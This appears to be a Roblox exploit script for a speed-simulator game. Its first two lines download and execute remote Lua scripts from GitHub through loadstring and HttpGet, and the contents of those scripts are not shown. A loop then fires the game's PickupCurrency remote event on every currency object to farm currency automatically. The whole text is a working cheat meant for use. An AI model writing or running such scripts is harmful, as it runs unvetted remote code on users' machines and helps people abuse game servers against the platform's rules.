loadstring(game:HttpGet("https://raw.githubusercontent.com/Luciquad/credit/main/sonicspeedsimulator.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/HadesRblx/src/master/HadesHub.lua", true))()

while wait(5) do
 task.wait()
 for i,v in pairs(workspace:FindFirstChild("World Currencies"):GetChildren()) do
   game:GetService("ReplicatedStorage").Knit.Services.WorldCurrencyService.RE.PickupCurrency:FireServer(v.Name)
   v:Destroy()
 end
end
